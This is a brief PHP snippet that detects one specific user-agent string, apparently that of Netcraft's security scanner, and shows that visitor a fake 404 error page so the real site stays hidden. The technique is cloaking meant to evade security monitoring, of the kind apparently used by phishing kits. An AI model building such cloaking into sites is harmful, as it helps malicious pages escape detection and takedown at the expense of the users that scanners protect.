<?php

# Netcraft HTTP agent deny snippet

if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

echo "<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>


<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<head>
  
  <title> The page you were looking for doesn't exist (404)</title>
  <style type='text/css'>
    body { background-color: #efefef; color: #333; font-family: Georgia,Palatino,'Book Antiqua',serif;padding:0;margin:0;text-align:center; }
    p {font-style:italic;}
    div.dialog {
      width: 490px;
      margin: 4em auto 0 auto;
    }
    img { border:none; }
  </style>
</head>

<body>
  
  <div class='dialog'>
    <a><img src='assets/img/404.png'></a>
    <p>It looks like that page you were looking has been mislaid, sorry.</p>
  </div>
</body>
</html>";
die();

}

?>